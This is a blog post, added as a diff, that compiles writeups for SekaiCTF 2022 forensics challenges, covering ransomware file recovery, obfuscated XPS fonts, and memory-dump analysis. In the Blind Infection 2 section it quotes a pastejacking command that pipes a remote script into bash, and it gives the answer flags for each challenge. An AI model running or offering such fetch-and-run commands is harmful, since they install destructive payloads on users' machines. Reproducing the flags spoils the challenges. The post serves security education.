@@ -1,0 +1,402 @@
+---
+title: 'SekaiCTF 2022: Forensics Writeup Compilation'
+date: '2022-11-28'
+lastmod: '2022-11-28'
+tags: ['compilation', 'forensics']
+summary: 'An organizer-written writeup compilation for selected forensics challenges from the SekaiCTF 2022 capture-the-flag competition.'
+thumbnail: '/static/images/sekaictf-2022/banner.png'
+images: ['/static/images/sekaictf-2022/banner.png']
+authors: ['enscribe']
+layout: PostSimple
+---
+
+### Intro
+
+[SekaiCTF 2022](http://2022.ctf.sekai.team/) — my first capture-the-flag which I've had the honor of organizing alongside fellow members of [Project Sekai CTF](https://sekai.team). One of the aspects of its administration was the challenge verification process; as part of it, I've ended up authoring a bunch of forensics-based writeups which I'm really proud of. They're also available on the [GitHub](https://github.com/project-sekai-ctf/sekaictf-2022) repository if you'd like to check out the rest of the challenges — I've simply ported them over here for my fancy website formatting. Enjoy!
+
+---
+
+<Challenge
+    title="Blind Infection 1"
+    solvers="jktrn"
+    authors="Battlemonger"
+    genre="forensics"
+    points="470"
+    solves="23"
+    description="*Investigator*: It looks like your files were encrypted — do you have a backup?  
+        *Me*: Online, yes, but even the backup links got encrypted. Can you help me find anything?"
+    files="[chall.zip](https://drive.google.com/u/0/uc?id=1d3vuYvnIRR1Nr0y-_g-Z5IjU3T4cZcAV)"
+/>
+
+<Box
+    text="**Warning**: This payload contains ransomware. Consider using a fresh virtual machine, as you may risk losing your data. Although surface analysis is safe (and the ransomware is user-triggered), proceed with caution."
+    type="warning"
+/>
+
+### Reconnaissance
+
+<CodeBlock src="sekaictf-2022/bi1-recon" terminal rawHTML />
+
+Unzipping the provided `.zip` provides us with four Linux directories: `etc/`, `home/`, `root/`, and `snap/`. Let's start off with a little bit of reconnaissance.
+
+A good habit with these types of challenges is to check `etc/passwd`, a list of system accounts. If we `grep` for those with root permission, we find that the user `sekaictf` was a superuser:
+
+<CodeBlock src="sekaictf-2022/bi1-grep" terminal rawHTML />
+
+Although it isn't necessarily pertinent to the challenge, make sure you check `home/sekaictf/.bash_history` alongside `grep -r "SEKAI{` - they can be pretty handy sometimes!
+
+### Document Recovery
+
+Next, we'll look for user files. The `Documents/` and `Pictures/` folder of the `sekaictf` user has them, but everything seems to be encrypted with no indication of the encryption method used.
+
+The description talks about having a backup for the encrypted files in the form of **links**, meaning we should be looking for browser-related content (i.e. search history). Ubuntu 22 stores Firefox as a `SnapCraft` app in `snap/` by default — we can also grep for the term `'firefox'` for its location:
+
+<CodeBlock src="sekaictf-2022/bi1-tree" terminal rawHTML />
+
+Firefox is located in `home/sekaictf/snap/firefox/`, while the profile information of the user is located at `firefox/common/.mozilla/firefox/p3zapakd.default/`. `p3zapakd` is the name of the user.
+
+Firefox stores your visit history in the `places.sqlite` SQLite database (read more about how Firefox stores your information [here](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data)). You can use an [online tool](https://inloop.github.io/sqlite-viewer/) or [`sqlite3`](https://www.npmjs.com/package/sqlite3) to view it! The table we need is `moz_places`, which is a hefty piece of work with more than 750+ URLs:
+
+![Screenshot of the `moz_places` table in `places.sqlite`](/static/images/sekaictf-2022/sqlite.png)
+
+Yes, it's super meticulous, but a true forensics investigator would champ it through! Scrolling through the table, we notice that the user follows a certain trend, as following:
+
+1. The user searches about a topic on Google
+2. The user visits that appear in the search results
+3. The user visits the URL https://paste.c-net.org with a subdirectory consisting of two random words (possibly to bookmark them for later)
+
+Visiting any of these pastes and recognizing that the content should be the same as encrypted files in the `Documents/` folder is key to Part 1. This is further facilitated by the fact that names of the encrypted files in `Documents/` are very descriptive:
+
+<CodeBlock src="sekaictf-2022/bi1-documents" terminal rawHTML />
+
+Instinctively, we would want to visit all these pastes.
+
+There are 50 instances of the URL https://paste.c-net.org in the table and visiting them one-by-one isn't very 1337 h4xx0r. We can execute some simple SQL on the table to extract all instances:
+
+<CodeBlock src="sekaictf-2022/bi1-sql" language="sql" />
+
+![Screenshot of the SQL query](/static/images/sekaictf-2022/execution.png)
+
+Let's write a simple `curl` script with Python:
+
+<CodeBlock
+    src="sekaictf-2022/bi1-curl-script"
+    language="python"
+    scrollable
+    fileName="solve.py"
+    title="Brute-forcing URL curls"
+/>
+
+Running the script:
+
+<CodeBlock src="sekaictf-2022/bi1-run" terminal rawHTML />
+
+<Box text="**Blind Infection 2**: `SEKAI{R3m3b3r_k1Dz_@lway5_84cKUp}`" type="flag" />
+
+---
+
+<Challenge
+    title="Blind Infection 2"
+    solvers="jktrn"
+    authors="Battlemonger"
+    genre="forensics"
+    points="488"
+    solves="15"
+    description="*Investigator*: Here are your backups, but what about rest of your files?  
+        *Me*: Umm...  
+        *Investigator*: I'm gonna need more details regarding what exactly you were doing."
+    files="[chall.zip](https://drive.google.com/u/0/uc?id=1d3vuYvnIRR1Nr0y-_g-Z5IjU3T4cZcAV)"
+/>
+
+<Box
+    text="**Warning**: This payload contains ransomware. Consider using a fresh virtual machine, as you may risk losing your data. Although surface analysis is safe (and the ransomware is user-triggered), proceed with caution."
+    type="warning"
+/>
+
+We've managed to restore the contents of `Documents/`, but this user has unfortunately failed to backup `Pictures/`. To decrypt them, we need to know the encryption method used. As of now, we only have the plaintext and ciphertext from Part 1, which currently don't prove that useful. We need more details.
+
+### The SQL Rabbit Hole
+
+Continuing to scroll through browser history, near the end of the table we come across instances of the user searching about 'virus' and 'virus remover'. This probably happened after the user's files got encrypted. Looking at the URL visits just before this, we see that the user was downloading various rhythm game-related items, including [osu!](https://osu.ppy.sh/) beatmaps and an `.apk` of [Project Sekai](https://projectsekai.fandom.com/wiki/Project_SEKAI_COLORFUL_STAGE!). This rabbit hole eventually led to a string of suspicious websites — including https://sekaictf-tunes.netlify.app:
+
+![Screenshot of pure HTML page with a suspicious wget command](/static/images/sekaictf-2022/sussy.png)
+
+<CodeBlock
+    src="sekaictf-2022/bi2-source"
+    language="html"
+    fileName="index.html"
+    title="Source Code of Sussy Website"
+/>
+
+Check out this snippet above: instead of copying `wget sekairhythms.com/epicmusic.zip`, we end up actually copying `curl https://storage.googleapis.com/sekaictf/Forensics/muhahaha.sh | bash`, which is a malicious bash script.
+
+This is the premise of the challenge. **Never copy and paste code/commands from internet blindly**! That's where the challenge name comes from — "Blind Infection"!
+
+This is a classic [pastejacking](https://www.geeksforgeeks.org/what-is-pastejacking/) attack. Let's _not_ copy it into the terminal and instead analyze the `.sh` file that's `curl`'ed. Visit the [original link](https://storage.googleapis.com/sekaictf/Forensics/muhahaha.sh) to see the raw code:
+
+<CodeBlock
+    src="sekaictf-2022/bi2-bash"
+    language="bash"
+    fileName="muhahaha.sh"
+    title="Malicious Obfuscated Bash Script"
+/>
+
+Looks like it's obfuscated by defining a crap ton of environmental variables and evaluating the concatenated contents. To deobfuscate, simply change the `eval` term to `echo` to see what actually runs:
+
+<CodeBlock
+    src="sekaictf-2022/bi2-deobfuscated"
+    language="bash"
+    fileName="muhahaha.sh"
+    title="Deobfuscated Bash Script"
+/>
+
+Let's do a quick analysis. This script:
+
+1. Downloads a binary quietly
+2. For each file in the `Documents/` and `Pictures/` folder, it:
+    - Generates a 16-byte key
+    - Performs a XOR operation with the key
+    - Removes the key (meaning the key is different every time)
+3. Deletes the binary and clears the contents of `~/.bash_history`
+
+We now know a simple XOR was used to encrypt `Pictures/`. However, we don't know the keys, and it would take until the heat death of the universe to brute force 16 bytes. Additionally, we can't extract utilize known-plaintext attacks on Part 1 since each key is unique. We'll need a different solution.
+
+We know that:
+
+1. The files in `Pictures/` are in the `.png` format
+2. XOR is reversible if we have a key
+3. We do not have a key readily available
+
+But, there is a weakness! If we research a bit into the `.png` format, we learn that the first 16 bytes of a `.png` are always same:
+
+<CodeBlock src="sekaictf-2022/bi2-header" language="text" showLineNumbers={false} />
+
+With this, we can XOR the first 16 bytes of each encrypted `.png` with this as the key to obtain the original, unique key. We can now decrypt each picture with this Python script:
+
+<CodeBlock
+    src="sekaictf-2022/bi2-solve"
+    language="python"
+    scrollable
+    fileName="solve.py"
+    title="Decrypting the Pictures"
+/>
+
+Use the `strings` command on `flag.png` to flag the challenge.
+
+<Box text="**Blind Infection 2**: `SEKAI{D4R3_4CC3PT38_4N8_4U5T38}`" type="flag" />
+
+---
+
+<Challenge
+    title="Broken Converter"
+    solvers="jktrn"
+    authors="blueset"
+    genre="forensics"
+    points="100"
+    solves="94"
+    description="Miku has finally finished her assignment and is ready to submit - but for some reason, the school requires all assignments to be submitted as `.xps` files. Miku found a converter online and used the converted file for submission. The file looked good at first, but it seems as if there’s something broken in the converter. Can you help her figure out what's wrong?"
+    files="[Assignment-broken.xps](/static/images/sekaictf-2022/Assignment-broken.xps)"
+/>
+
+<Box text="**Note**: This challenge shares the same file as *flag Mono*." type="info" />
+
+Reading the Wikipedia page for [Open XML Paper Specification](https://en.wikipedia.org/wiki/Open_XML_Paper_Specification)/`.xps` files, we can see that `Assignment-broken.xps` is actually a `.zip` archive:
+
+> An XPS file is a [ZIP](<https://en.wikipedia.org/wiki/ZIP_(file_format)> 'ZIP (file format)') archive using the [Open Packaging Conventions](https://en.wikipedia.org/wiki/Open_Packaging_Conventions 'Open Packaging Conventions'), containing the files which make up the document. These include an XML markup file for each page, text, [embedded fonts](https://en.wikipedia.org/wiki/Odttf 'Odttf'), raster images, 2D [vector graphics](https://en.wikipedia.org/wiki/Vector_graphics 'Vector graphics'), as well as the [digital rights management](https://en.wikipedia.org/wiki/Digital_rights_management 'Digital rights management') information. The contents of an XPS file can be examined by opening it in an application which supports ZIP files.
+
+Renaming the file extension to `.zip` will provide us with some files:
+
+![Viewing the renamed `.xps` file in WinRAR](/static/images/sekaictf-2022/zip.png)
+
+In `Resources/` we can find `02F30FAD-6532-20AE-4344-5621D614A033.odttf`, which is an "Obfuscated OpenType" file:
+
+![Viewing `Resources/` file in WinRAR](/static/images/sekaictf-2022/odttf.png)
+
+The ODTTF [Wikipedia](https://en.wikipedia.org/wiki/ODTTF) page states that `.odttf` files are obfuscated by performing a XOR operation on the first 32 bytes of the font file, using its GUID (or the filename) as the key:
+
+> According to the source code of [Okular](https://en.wikipedia.org/wiki/Okular 'Okular') (see function `parseGUID()` and method `XpsFile::loadFontByName()`), the first 32 bytes of the font file are obfuscated by XOR using the font file name (a GUID). The rest of the file is normal OpenType.
+
+This is also mentioned in section 9.1.7.3 of the [XPS Standard](https://www.ecma-international.org/wp-content/uploads/XPS-Standard.pdf):
+
+> Perform an XOR operation on the first 32 bytes of the binary data of the obfuscated font part with the array consisting of the bytes referred to by the placeholders B37, B36, B35, B34, B33, B32, B31, B30, B20, B21, B10, B11, B00, B01, B02, and B03, in that order and repeating the array once. The result is a non-obfuscated font.
+
+Although you can totally create a XOR script and perform it manually, you can also find scripts online. [odttf2ttf](https://github.com/somanchiu/odttf2ttf) provides an online demo [here](https://somanchiu.github.io/odttf2ttf/js/demo), which is a simple drag-and-drop with instant conversion:
+
+![Conversion using odttf2ttf](/static/images/sekaictf-2022/conversion.png)
+
+Now that it's deobfuscated, we can open the file in Windows Font Viewer. The phrase `GlYPHZ,W3|!.d0n&}` is visible at the top, but the rest of the flag isn't properly ordered:
+
+![Viewing unordered glyphs in default font viewer](/static/images/sekaictf-2022/fontviewer.png)
+
+However, opening the `.ttf` file in programs that sort by ASCII, such as [FontForge](https://fontforge.org/) or [FontDrop!](https://fontdrop.info/), will yield a flag:
+
+![Visible flag in program window for FontForge](/static/images/sekaictf-2022/broken-converter-flag-fontforge.png)
+
+<Box text="**Broken Converter**: `SEKAI{sCR4MBLeD_a5ci1-FONT+GlYPHZ,W3|!.d0n&}`" type="flag" />
+
+---
+
+<Challenge
+    title="flag Mono"
+    solvers="jktrn"
+    authors="blueset"
+    genre="forensics"
+    points="368"
+    solves="47"
+    description='When writing the assignment, Miku used a font called **flag Mono**. Despite it looking just like a regular monospaced font, it claims itself to be **stylistic** in various ways.  
+    "Perhaps there is something special about it", Miku thought.'
+    files="[Assignment-broken.xps](/static/images/sekaictf-2022/Assignment-broken.xps)"
+/>
+
+<Box text="**Note**: This challenge shares the same file as *Broken Converter*." type="info" />
+
+If you inspect the font info in [FontForge](https://fontforge.org/) with `Ctrl` + `Shift` + `F`, you can see in the Lookup tab that four different "Style Sets" have been implemented into this font:
+
+![Inspecting the "Lookup" tab in FontForge](/static/images/sekaictf-2022/lookup.png)
+
+These are called "OpenType Stylistic Sets". According to its official Microsoft [documentation](https://docs.microsoft.com/en-us/typography/opentype/spec/features_pt#ssxx):
+
+> In addition to, or instead of, stylistic alternatives of individual glyphs [...], some fonts may contain sets of stylistic variant glyphs corresponding to portions of the character set, e.g. multiple variants for lowercase letters in a Latin font.
+
+In FontForge you can actually view the ruleset for these styles with the `Edit Data` button. This is the ruleset for `ss01`:
+
+![Inspecting stylistic set ruleset $2 in FontForge](/static/images/sekaictf-2022/ruleset.png)
+
+> ampersand quotesingle | a @&lt;Single Substitution lookup 4&gt; | g  
+> | f @&lt;Single Substitution lookup 4&gt; | l a g  
+> ampersand quotesingle parenleft | g @&lt;Multiple Substitution lookup 5&gt; |  
+> ampersand | l @&lt;Single Substitution lookup 4&gt; | a g
+
+Let's test out typing `flag` on [FontDrop!](https://fontdrop.info/) and changing the stylistic set:
+
+![Changing stylistic sets on FontDrop!](/static/images/sekaictf-2022/mono-flag.gif)
+
+<Box text="**flag Mono**: `SEKAI{OpenTypeMagicGSUBIsTuringComplete}`" type="flag" />
+
+---
+
+<Challenge
+    title="Symbolic Needs 1"
+    solvers="jktrn"
+    authors="Battlemonger"
+    genre="forensics"
+    points="467"
+    solves="24"
+    description="We recently got hold of a cryptocurrency scammer and confiscated his laptop.  
+    Analyze the memdump. Submit the string you find wrapped with `SEKAI{}`."
+    files="[memdump](https://drive.google.com/file/d/1l4PHepz1TbogHpAOxH356HxzlxTNuGqp/edit)"
+/>
+
+Inflating the `.zip`, we are given a `.mem` memory dump of a machine of an unknown operating system. We will be using the [Volatility 3](https://www.volatilityfoundation.org/) framework to analyze it.
+
+Firstly, clone the [repository](https://github.com/volatilityfoundation/volatility3.git) on GitHub:
+
+<CodeBlock src="sekaictf-2022/sn1-clone" terminal rawHTML />
+
+Since we'll need to find a debugging package for this memory dump later, we need to run the `banner` command to identify the exact operating system, version and kernel:
+
+<CodeBlock src="sekaictf-2022/sn1-banner" terminal rawHTML />
+
+This identifies the following:
+
+-   **OS**: Ubuntu 22.04
+-   **Kernel**: Linux version 5.15.0-43-generic
+
+**Note**: Since these are very recent versions, there were no readily available Volatility profiles. Honestly, I couldn't make Volatility 2 work with Ubuntu 22 even after successful profile creation (`KeyError: 'DW_AT_data_member_location'`). Let me know if you were able to, since everyone's learning! :)
+
+**Profile Creation + Symbol Table:**
+
+In order to run Volatility plugins we need to build a [symbol table](https://volatility3.readthedocs.io/en/latest/symbol-tables.html#) in the `.json` format. They can be generated from [DWARF](https://en.wikipedia.org/wiki/DWARF) files using the [dwarf2json](https://github.com/volatilityfoundation/dwarf2json) tool. The hardest part is probably finding the kernel with debugging symbols for Linux version `5.15.0-43-generic`. A complete list is available [here](http://ddebs.ubuntu.com/pool/main/l/linux/), but [`linux-image-unsigned-5.15.0-43-generic-dbgsym_5.15.0-43.46_amd64.ddeb`](http://ddebs.ubuntu.com/pool/main/l/linux/linux-image-unsigned-5.15.0-43-generic-dbgsym_5.15.0-43.46_amd64.ddeb) is the version we need. After inflating the archive, the relevant file we need is the `vmlinux-5.15.0-43-generic` DWARF located in `usr/lib/debug/boot`.
+
+Next, we'll clone the [dwarf2json](https://github.com/volatilityfoundation/dwarf2json) tool from the Volatility repository and build it:
+
+<CodeBlock src="sekaictf-2022/sn1-dwarf2json" terminal rawHTML />
+
+Finally, we can run:
+
+<CodeBlock src="sekaictf-2022/sn1-dwarf2json-run" terminal rawHTML />
+
+Copy the symbol table to `volatility3/volatility3/symbols/linux`, and your profile should be set up!
+
+Once we have a valid `symbols.json`, we can run Volatility 3 plugins. The first one we always run is `linux.bash`, to display bash history:
+
+<CodeBlock src="sekaictf-2022/sn1-bash-history" terminal rawHTML />
+
+Those are easily identifiable as ASCII codes. Convert `72 48 117 53 84 48 110 95 119 51 95 52 114 51 95 49 110 33 33 33` to text and get the flag:
+
+<Box text="**Symbolic Needs 1**: `SEKAI{H0u5T0n_w3_4r3_1n!!!}`" type="flag" />
+
+---
+
+<Challenge
+    title="Symbolic Needs 2"
+    solvers="jktrn"
+    authors="Battlemonger"
+    genre="forensics"
+    points="482"
+    solves="18"
+    description="Recover the private key of the wallet address `0xACa5872e497F0Cc626d1E9bA28bAEC149315266e`. Submit the key wrapped with `SEKAI{}`."
+    files="[memdump](https://drive.google.com/file/d/1l4PHepz1TbogHpAOxH356HxzlxTNuGqp/edit)"
+/>
+
+Let's follow up from the last proglem with the `linux.psaux` plugin, to gather and display all processes:
+
+<CodeBlock src="sekaictf-2022/sn2-psaux" terminal rawHTML />
+
+It looks like the scammer was serving some base32 through Netcat. We also notice that it's piped into a `.pyc` file, which is Python bytecode.
+
+Run the command `echo [PUT YOUR BASE32 HERE] | base32 -d > file.pyc` to convert this base32 into a binary. Let's run the `.pyc` with Python3:
+
+<CodeBlock src="sekaictf-2022/sn2-pyc-run" terminal rawHTML />
+
+Passing a random argument results in a `FileNotFoundError`:
+
+<CodeBlock src="sekaictf-2022/sn2-error" terminal rawHTML />
+
+We can find this wordlist in the [bitcoin/bips](https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt) repository. If you run the binary again with the same argument it just outputs "Wrong". We'll need to disassemble this.
+
+Disassemble the bytecode with the `dis` module:
+
+<CodeBlock
+    src="sekaictf-2022/sn2-script"
+    language="python"
+    fileName="disassembled.py"
+    title="Disassembling the Python Bytecode"
+/>
+
+<CodeBlock src="sekaictf-2022/sn2-script-run" terminal rawHTML scrollable />
+
+Let's analyze this:
+
+1. The program loads the [`bip39`](https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt) wordlist. It's a standard wordlist used to secure crypto wallets with a mnemonic.
+2. It then stores a hardcoded integer in the variable `code`, converts to binary and `zfill`s it so that length is multiple of 12.
+3. Next, it converts each 12 bits to decimal, and subtracts one. This number is used as an index, and appends the corresponding word from `bip39` in an array called `mnemonic`.
+4. No matter what, the code will always print "Wrong"! :D
+
+Let's write a simple script to find the mnemonics with this information:
+
+<CodeBlock
+    src="sekaictf-2022/sn2-mnemonic"
+    language="python"
+    fileName="mnemonic.py"
+    title="Mnemonic Finder"
+/>
+
+Running the script:
+
+<CodeBlock src="sekaictf-2022/sn2-mnemonic-run" terminal rawHTML />
+
+Looks like we've got our mnemonic!
+
+Now we can visit [MyEtherWallet](https://www.myetherwallet.com/wallet/access/software?type=mnemonic) and enter the 24-word mnemonic phrase. Look for the `0xACa5872e497F0Cc626d1E9bA28bAEC149315266e` wallet and gain access to the dashboard:
+
+![MEW dashboard](/static/images/sekaictf-2022/dashboard.png)
+
+To access the private key, go to `My personal account` -> `View paper wallet`:
+
+![Viewing wallet](/static/images/sekaictf-2022/wallet.png)
+
+<Box
+    text="**Symbolic Needs 2**: `SEKAI{0x81c458e9fae445de18385a3379513acc8e191e4c2667c85aa0a52a32ec4e6d55}`"
+    type="flag"
+/>
